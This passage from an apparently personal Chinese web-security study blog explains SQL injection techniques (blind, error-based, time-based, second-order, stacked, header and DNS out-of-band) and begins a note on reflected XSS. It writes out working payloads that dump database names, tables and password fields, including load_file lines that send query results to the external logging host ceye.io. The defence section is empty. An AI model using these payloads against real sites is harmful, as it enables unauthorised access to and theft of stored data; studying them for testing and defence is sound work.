var(--b3-card-error-color);">与函数</span><code>right()</code>​​</h6><p>语法：<code>left(str,num)</code>​对字符串str从左开始数起，返回num个字符（与函数<code>right()</code>​相反）</p><p><img src="/assets/image-20240728160416-kw8edn1.png" alt="image">​</p></li><li><h6 id="函数substr-​​"><a href="#函数substr-​​" class="headerlink" title="函数substr()​​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>substr()</code>​​</h6><blockquote><p><code>substr()</code>​和<code>substring()</code>​函数实现的功能是一样的，均为截取字符串。<br>​<code>substr(database(),1,1)</code>​查看数据库名第一位，<code>substr(database(),2,1)</code>​查看数据库名第二位，依次查看各位字符。</p></blockquote><p>语法：<code>substr(database(),1,3)</code>​当前数据库名为security，从第1位开始，截取3位</p><p><img src="/assets/image-20240728160650-nsdqfdr.png" alt="image">​</p><p>语法：<code>substr(database(),4,1)</code>​当前数据库名为security，从第4位开始，截取1位</p><p><img src="/assets/image-20240728160802-lf2m804.png" alt="image">​</p></li><li><h6 id="函数mid-​​"><a href="#函数mid-​​" class="headerlink" title="函数mid()​​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>mid()</code>​​</h6><p>与<code>substr()</code>​函数用法相同</p><p><img src="/assets/image-20240728160854-8r1x7n9.png" alt="image">​</p></li><li><h6 id="函数ascii-​​"><a href="#函数ascii-​​" class="headerlink" title="函数ascii()​​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>ascii()</code>​​</h6><p>返回字符串str的<strong>最左字符</strong>的数值，ASCII()返回数值是从0到255</p><p><img src="/assets/image-20240728161042-7qjwf7q.png" alt="image">​</p><p><img src="/assets/image-20240728161052-fn1uom4.png" alt="image">​</p></li><li><h6 id="函数ord-​​"><a href="#函数ord-​​" class="headerlink" title="函数ord()​​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>ord()</code>​​</h6><p>与函数<code>ascii()</code>​相同，返回字符串第一个字符的 ASCII 值。</p><p><img src="/assets/image-20240728161201-v70oxs9.png" alt="image">​</p></li></ul><p>‍</p><h5 id="常规注入流程-1"><a href="#常规注入流程-1" class="headerlink" title="常规注入流程"></a>常规注入流程</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">Left</span>判断<br>#数据库从左往右第一个字符是否为s<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and left(database(),1)=&#x27;</span>s<span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">#数据库从左往右前两个字符是否为sa</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">left</span>(database(),<span class="hljs-number">2</span>) <span class="hljs-operator">&gt;</span> <span class="hljs-string">&#x27;sa&#x27;</span> <span class="hljs-comment">--+</span><br><br><br><span class="hljs-keyword">Like</span>语句判断<br>#该表名第一个字符是否为e<br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select table_name from information_schema.tables where table_schema=database() limit 0,1)like &#x27;</span>e<span class="hljs-operator">%</span><span class="hljs-string">&#x27;--+</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">ascii语句判断</span><br><span class="hljs-string">#该表名第一个字符的ASCII码值是否为115</span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))<span class="hljs-operator">=</span><span class="hljs-number">115</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h4 id="报错型"><a href="#报错型" class="headerlink" title="报错型"></a>报错型</h4><h5 id="常见函数-2"><a href="#常见函数-2" class="headerlink" title="常见函数"></a>常见函数</h5><ul><li><h6 id="函数extractvalue-​​"><a href="#函数extractvalue-​​" class="headerlink" title="函数extractvalue()​​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>extractvalue()</code>​​</h6><p>此函数从目标XML中返回包含所查询值的字符串</p><p>语法：extractvalue（XML_document，xpath_string）</p><p>第一个参数：string格式，为XML文档对象的名称</p><p>第二个参数：xpath_string（xpath格式的字符串）</p><p>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1, concat(0x7e,(select @@version),0x7e))--+ (爆出版本号)</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version_compile_os</span>),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">--+ (爆出操作系统)</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1, concat(0x7e,(select schema_name from information_schema.schemata ),0x7e))--+ （爆数据库）</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;数据库名&#x27;</span> ),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">--+ （爆数据表）</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1, concat(0x7e,(select column_name from information_schema.columns where table_name=&#x27;</span>表名<span class="hljs-string">&#x27; ),0x7e))--+（爆字段）</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>, concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,password) <span class="hljs-keyword">from</span> 数据库名.表名 ),<span class="hljs-number">0x7e</span>))<span class="hljs-comment">--+ （爆数据）</span><br></code></pre></td></tr></table></figure></li></ul><ul><li><h6 id="函数updatexml-​​"><a href="#函数updatexml-​​" class="headerlink" title="函数updatexml()​​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>updatexml()</code>​​</h6><p>此函数使用不同的xml标记匹配和替换xml块改变文档中符合条件的节点的值</p><p>语法： updatexml（XML_document，XPath_string，new_value）</p><p>第一个参数：是string格式，为XML文档对象的名称，文中为Doc</p><p>第二个参数：代表路径，Xpath格式的字符串例如&#x2F;&#x2F;title【@lang】</p><p>第三个参数：string格式，替换查找到的符合条件的数据</p><p>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</p><p>细节问题： <code>extractvalue()</code>​基本一样，改个关键字<code>updatexml</code>​即可,与<code>extractvalue</code>​有个很大的区别实在末尾注入加上，如：<code>(1,concat(select @@version),1)</code>​而<code>extractvalue</code>​函数末尾不加1（数值）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1, concat(0x7e,(select schema_name from information_schema.schemata ),0x7e),1)--+ （爆数据库）</span><br><span class="hljs-string">                                                                                        区别：这里多加一个1</span><br></code></pre></td></tr></table></figure></li><li><h6 id="函数floor-​"><a href="#函数floor-​" class="headerlink" title="函数floor()​"></a><span data-type="text" style="background-color: var(--b3-card-error-background); color: var(--b3-card-error-color);">函数</span><code>floor()</code>​</h6><ul><li><p>函数<code>rand()</code>​</p><p><code>rand()</code>​可以产生一个在0和1之间的随机数，且每次产生的数值都不一样</p><p><img src="/assets/image-20240728163923-bx4gb7g.png" alt="image">​</p><p>但当我们提供了一个固定的随机数的种子0之后，每次产生的值都是相同的，这也可以称之为伪随机。</p><p><img src="/assets/image-20240728164019-3plppga.png" alt="image">​</p></li></ul><p><code>floor()</code>​函数的作用就是返回<strong>小于等于括号内该值的最大整数</strong>。</p><p>函数<code>floor (rand(0)*2)</code>​</p><p><code>rand()</code>​本身是返回0~1的随机数，但在后面*2（这是乘法，不是2次方）就变成了返回0~2之间的随机数。<br>配合上floor函数就可以产生确定的两个数，即0和1。<br>并且结合固定的随机数种子0，它每次产生的随机数列都是相同的值。</p><ul><li><p>函数<code>group by</code>​</p><p>作用就是分类汇总</p><p>先看表中内容</p><p><img src="/assets/image-20240728164700-z4tt96n.png" alt="image">​</p><p>再在id 和 name后分别放入a x，意思就是id显示为a name显示为x</p><p><img src="/assets/image-20240728164736-4r1t22q.png" alt="image">​</p><p>然后使用group by 函数进行分组，并且按照x（name）进行排序</p><p><img src="/assets/image-20240728164750-c340r0g.png" alt="image">​</p><p>如果使用group by 函数出现问题，可能是由于启用了ONLY_FULL_GROUP_BY SQL模式（默认情况下），MySQL将拒绝选择列表，HAVING条件或ORDER BY列表的查询引用在GROUP BY子句中既未命名的非集合列，也不在功能上依赖于它们。</p><p>解决问题：<a href="https://blog.csdn.net/weixin/_41991232/article/details/82803170">https://blog.csdn.net/weixin\_41991232/article/details/82803170</a></p></li><li><p>函数<code>count()</code>​</p><p>作用为统计结果的记录数</p></li></ul><p>‍</p><p>通过 floor 报错的方法来爆数据的本质是 group by 语句的报错。group by 语句报错的原因是 floor(random(0)*2)的不确定性，即可能为 0 也可能为 1</p><p>注意！！实际测试中发现，出现报错，至少要求数据记录为 3 行，记录数超过 3 行一定会报错，2 行时是不报错的。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(),concat(0x7e,(select database()),0x7e,floor(rand(0)2))a from information_schema.schemata group by a--+</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(),concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">--+ (爆数据库，不断改变limit得到其他)</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(),concat(0x7e,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; limit 3,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （爆出users表）</span><br><span class="hljs-string"></span><br><span class="hljs-string">?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-built_in">count</span>(),concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;users&#x27;</span> limit <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<span class="hljs-number">0x7e</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>))a <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> a<span class="hljs-comment">--+ （爆出password字段）</span><br><br>?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; union select 1,count(),concat(0x7e,(select password from security.users limit 2,1),0x7e,floor(rand(0)2))a from information_schema.columns group by a--+ （爆出数值）</span><br></code></pre></td></tr></table></figure></li></ul><p>‍</p><p>‍</p><h4 id="时间型"><a href="#时间型" class="headerlink" title="时间型"></a>时间型</h4><p>时间型注入在部分页面上无法体现出来，此时可通过burp抓包再进行测试</p><p>在MySQL中，有一个<code>Benchmark()</code>​函数，它是用于测试性能的。Benchmark(count,expr) ，这个函数执行的结果，是将表达式 expr 执行 count 次 。</p><blockquote><ol><li><p>判断注入点<br> 语句：<br> ?id&#x3D;1’ and sleep(5)– -  &#x2F;&#x2F;正常休眠<br> ?id&#x3D;1” and sleep(5)– -  &#x2F;&#x2F;无休眠<br> ?id&#x3D;1’) and sleep(5)– - &#x2F;&#x2F;无休眠<br> ?id&#x3D;1”) and sleep(5)– - &#x2F;&#x2F;无休眠<br> 总结：由此可以判断注入点为数值型注入点 包裹符号为’号</p></li><li><p>判断当前数据库库名的长度<br> 语句：<br> ?id&#x3D;1’ and if(length(database())&#x3D;8,sleep(10),1)– -<br> ps：通过改变数据库的长度的值来判断，是数据库名<br> 如：length(database())&#x3D;N</p></li><li><p>判断当前数据库下的库名<br> 语句：<br> ?id&#x3D;1’ and if(ascii(substr(database(),1,1))&#x3D;115,1,sleep(10))– -<br> ps：通过判断服务器没有睡眠，ascii码转换115为s ，那么就得出数据库第一个字符为s,下面就可以一次类推了,就不一一演示<br> 重点：substr(database(),N,1)可以通过改变N的值来判断数据的地几个字符为什么</p></li><li><p>猜表名<br> 语句：<br> ?id&#x3D;1’ and if((select ascii(substr((select table_name from information_schema.tables where table_schema&#x3D;”security”limit 0,1),1,1)))&#x3D;101,sleep(5),1)– -<br> ps：security的第一张表的第一个字符ascii为101，为字符e<br> limit 0,1),N,1还是改变N的的得出第二个字符</p></li><li><p>猜字段语句：<br> ?id&#x3D;1’ and if((select ascii(substr((select column_name from information_schema.columns where table_name&#x3D;”表名”limit 0,1),N,1)))&#x3D;101,0,sleep(5))– -</p></li><li><p>猜数据：<br> and if((select ascii(substr((select 字段名 from 库名.表名 limit 0,1),N,1)))&#x3D;101,0,sleep(5))</p></li></ol></blockquote><p>‍</p><p>‍</p><p>‍</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>没教，日后自学补充</p><p>参考:<a href="https://xz.aliyun.com/t/13604?time__1311=GqmxuD9QiQdWqGNDQ0PBK4OODg7pzdqa4D#toc-28">MYSQL 注入总结+原理深度分析 - 先知社区 (aliyun.com)</a></p><h4 id="什么是宽窄字节"><a href="#什么是宽窄字节" class="headerlink" title="什么是宽窄字节?"></a>什么是宽窄字节?</h4><p>当某字符的大小为一个字节时，称其字符为窄字节，当某字符的大小为两个或更多字节时，称其字符为宽字节，而且不同的字符编码方式和字符集对字符的大小有不同的影响</p><p>例如，在 ASCII 码中，一个英文字母（不分大小写）为一个字节，一个中文汉字为两个字节；在 UTF-8 编码中，一个英文字为一个字节，一个中文为三个字节；在 Unicode 编码中，一个英文为一个字节，一个中文为两个字节</p><p>‍</p><p>‍</p><p>‍</p><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>环境复现参考周报7.15-7.28,有助于理解</p><p><img src="/assets/image-20240727195901-3vrv0es.png" alt="image">​</p><p>通俗点讲就是第一次是将SQL语句植入进去，但是由于代码层对特殊字符进行了转义导致语句不能执行，第二次使用能从数据库调用该语句的功能，从而实现SQL注入。</p><p>举例：当登录账户后选择修改密码时不会再向你询问用户名是什么，而是从数据库中直接获取当前用户名，所以此时用户名可以作为一个注入点</p><h4 id="实现条件"><a href="#实现条件" class="headerlink" title="实现条件"></a>实现条件</h4><p>实现二次注入，源码中有对应的转义<code>（magic_quotes_gpc）</code>​或使用转义函数<code>（addslashes）</code>​</p><ul><li><p><code>addslashes</code>​ 是一个 PHP 函数，用于对字符串中的特殊字符进行转义，<strong>返回在预定义的字符前添加反斜杠的字符串。</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span> <span class="hljs-title function_ invoke__">addslashes</span> ( <span class="hljs-keyword">string</span> <span class="hljs-variable">$str</span> )<br><span class="hljs-comment">//参数：`$str` 是要进行转义的字符串。</span><br><span class="hljs-comment">//返回值：返回转义后的字符串。</span><br></code></pre></td></tr></table></figure><p><strong>返回在预定义的字符前添加反斜杠的字符串。</strong></p><p>预定义字符是：</p><ul><li>单引号（’）</li><li>双引号（”）</li><li>反斜杠（\）</li><li>零</li></ul></li><li><p><code>magic_quotes_gpc</code>​ 是一个在早期版本的 PHP 中存在的配置选项，其作用是<strong>自动对从 GET、POST 和 COOKIE 获取的数据进行转义</strong>。</p><ol><li><p><strong>自动转义：</strong>  当 <code>magic_quotes_gpc</code>​ 启用时，PHP 会在从 <code>GET</code>​、<code>POST</code>​ 和 <code>COOKIE</code>​ 中获取的数据中自动添加转义斜杠，使特殊字符成为安全的字符串。<strong>例如，单引号</strong>  <strong>​<code>&#39;</code>​</strong> ​ <strong>被转义为</strong>  <strong>​<code>\\&#39;</code>​</strong> ​</p><p> 示例:</p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 假设 magic_quotes_gpc 已启用</span><br><br><span class="hljs-variable">$user_input</span> = <span class="hljs-string">&quot;It&#x27;s a sample input&quot;</span>;<br><span class="hljs-comment">// $user_input 变量包含 &quot;It\\&#x27;s a sample input&quot;</span><br><br><span class="hljs-comment">// 在早期的 PHP 版本中，这样的输入在插入到数据库时会被自动转义</span><br></code></pre></td></tr></table></figure></li></ol></li></ul><p>‍</p><p>‍</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>环境复现参考周报7.15-7.28</p><p>堆叠注入原理就是<strong>通过结束符</strong>​ <strong>​<code>;</code>​</strong> ​<strong>同时执行多条sql语句</strong></p><p>例如php中的<code>mysqli_multi_query</code>​函数。与之相对应的<code>mysqli_query()</code>​只能执行一条SQL，所以要想目标存在堆叠注入,在目标主机存在类似于<strong>​<code>mysqli_multi_query()</code>​</strong> ​这样的函数**,根据数据库类型决定是否支持多条语句执行.<br>支持堆叠数据库：MYSQL MSSQL Postgresql等</p><p>‍</p><p>‍</p><p>‍</p><h3 id="请求包注入"><a href="#请求包注入" class="headerlink" title="请求包注入"></a>请求包注入</h3><p>burp抓包进行注入</p><p>常见注入位置:</p><ul><li><p>Cookie注入</p><p>User-Agent注入</p><p>X-Forwarded-For注入(如果没有就自己加上然后尝试)</p><p>Referer注入</p></li></ul><p>‍</p><p>‍</p><p>‍</p><h3 id="DNS带外注入"><a href="#DNS带外注入" class="headerlink" title="DNS带外注入"></a>DNS带外注入</h3><p>参考:<a href="https://blog.csdn.net/weixin_48083470/article/details/119379081">DNSlog注入 信息的 带外|外带 sql注入利用详解+实操_mysql dns外带-CSDN博客</a></p><p><strong>产生原因：有部分注入点是没有回显的，所有读取也是没回显的，采用带外的形式，回显数据</strong></p><p>注入条件：</p><ol><li>root高权限且支持<code>load_file()</code>​函数mysql有个<code>secure-file-priv</code>​配置会限制<code>load_file</code>​函数</li><li>windows系统（需要用到\号）为啥payload需要用到四个\\，就是因为数据库转义</li></ol><p>‍</p><p>使用平台:</p><p><a href="http://ceye.io/">http://ceye.io</a></p><p><a href="http://www.dnslog.cn/">http://www.dnslog.cn</a></p><p>‍</p><p>带外应用场景：</p><p>解决<strong>不回显，反向连接，SQL注入，命令执行，SSRF</strong>等</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">/</span><span class="hljs-operator">/</span> 查询当前数据库<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> load_file(concat(&quot;\\\\&quot;,database(),&quot;.dbuh8a.ceye.io\\asdt&quot;))<br> <br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询其他数据库<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> load_file(concat(&quot;\\\\&quot;,(<span class="hljs-keyword">select</span> schema_name <span class="hljs-keyword">from</span> information_schema.schemata limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&quot;.dbuh8a.ceye.io\\xxx.txt&quot;))<br>&quot;&quot;&quot;<br>由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数<br>limit 0,1 查询第一个数据库名<br>limit 1,1 查询第二个数据库名<br>limit 2,1 查询第三个数据库名<br>&quot;&quot;&quot;<br> <br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询版本号<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> load_file(concat(&quot;\\\\&quot;,version(),&quot;.dbuh8a.ceye.io\\xxx.txt&quot;))<br> <br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询当前数据库demo01中第一个表名<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> load_file(concat(&quot;\\\\&quot;,(<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;demo01&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span> ),&quot;.dbuh8a.ceye.io\\xxx.txt&quot;))<br> <br>&quot;&quot;&quot;<br>由于该DNS记录只能回显一个字段，所以因该使用limit，第一个参数是查询起始位置，第二个参数是查询个数<br>limit 0,1 查询第一个表名<br>limit 1,1 查询第二个表名<br>limit 2,1 查询第三个表名<br>&quot;&quot;&quot;<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询security数据库emails表下第一个列名<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> load_file(concat(&quot;\\\\&quot;,(<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span><span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span><span class="hljs-string">&#x27;emails&#x27;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&quot;.dbuh8a.ceye.io\\xxx.txt&quot;))<br> <br><span class="hljs-operator">/</span><span class="hljs-operator">/</span>查询字段值  数据库名为security 表名emails 列名id<br>id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> load_file(concat(&quot;\\\\&quot;,(<span class="hljs-keyword">select</span> id <span class="hljs-keyword">from</span> security.emails limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),&quot;.dbuh8a.ceye.io\\xxx.txt&quot;))<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h3 id="正则注入"><a href="#正则注入" class="headerlink" title="正则注入"></a>正则注入</h3><p>未学,日后自行补充</p><p>‍</p><h1 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h1><p><a href="https://www.cnblogs.com/Vinson404/p/7253255.html">https://www.cnblogs.com/Vinson404/p/7253255.html</a></p><p>‍</p><p>‍</p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ol><li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li><li>网页篡改：通过操作数据库对特定网页进行篡改。</li><li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li><li>服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li><li>破坏硬盘数据，瘫痪全系统。</li></ol><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h1><p>‍</p><p>‍</p><p>‍</p><p>‍</p><h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1>]]></content>
    
    
    <categories>
      
      <category>WEB攻防</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WEB攻防</tag>
      
      <tag>SQL注入漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XSS漏洞🦠</title>
    <link href="/2024/03/26/XSS%E6%BC%8F%E6%B4%9E%F0%9F%A6%A0/"/>
    <url>/2024/03/26/XSS%E6%BC%8F%E6%B4%9E%F0%9F%A6%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><p>XSS 攻击全称跨站脚本攻击，是为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为 XSS，XSS 是一种在 web 应用中的计算机安全漏洞，它允许恶意 web 用户将代码植入到 web网站里面，供给其它用户访问，当用户访问到有恶意代码的网页就会产生 xss 攻击</p><p>重点在于<strong>输入和输出</strong></p><p><a href="assets/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%89%8B%E5%86%8CWEB%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E-20240327132410-5mt5mil.pdf">渗透测试手册WEB安全漏洞.pdf</a></p><h1 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h1><h2 id="反射型"><a href="#反射型" class="headerlink" title="反射型"></a>反射型</h2><p>非持久化，需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面</p><p>常见情况是攻击者通过<strong>构造一个恶意链接的形式</strong>，诱导<strong>用户传播和打开</strong>，由于链接内所携带的参数会回显于页面中或作为页面的处理数据源，最终造成XSS攻击。</p><p><img src="/assets/image-20240804160714-i2rfx6i.png" alt="image">​</p><h5 id="简单案例"><a href="#简单案例" class="headerlink" title="简单案例"></a>简单案例</h5><p>xss.php</p><p><img src="/assets/image-20240804161124-ypuz97i.png" alt="image">​</p><ol><li><p>设置x值为什么，相应就会解析执行什么</p><p> <img src="/assets/image-20240804161224-h0cis5h.png" alt="image">​</p></li><li><p>利用嵌套js格式，生成嵌套网址：192.168.137.1:84&#x2F;xss.php?x&#x3D;<iframe src="http://www.xiaodi8.com">test</iframe></p></li><li><p>如果这段代码被插入到一个网页中，并且该网页的用户受到攻击者的控制，那么该用户的浏览器将加载 <a href="http://www.xiaodi8.com/">http://www.xiaodi8.com</a> 这个地址，并在页面中嵌入一个 &lt;&#x2F;iframe&#x2F;&gt; 元素，显示该地址的内容。</p><p> <img src="/assets/image-20240804161250-yrdqiwe.png" alt="image">​</p></li><li><p>那么就可能导致跨站脚本攻击。攻击者可能会尝试利用这种方式来窃取用户的信息、劫持用户会话，或者进行其他恶意活动。</p></li></ol><p>‍</p><ul><li><p>需要注意的问题</p><ol><li><p>真实的XSS攻击语句，需要考<strong>虑输入和输入的格式</strong></p></li><li><p><strong>输入可能会有过滤，输出可能会有其他符号的拼接造成攻击语句执行失败</strong></p> <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//反射型</span><br><span class="hljs-variable">$code</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;x&#x27;</span>];<br><span 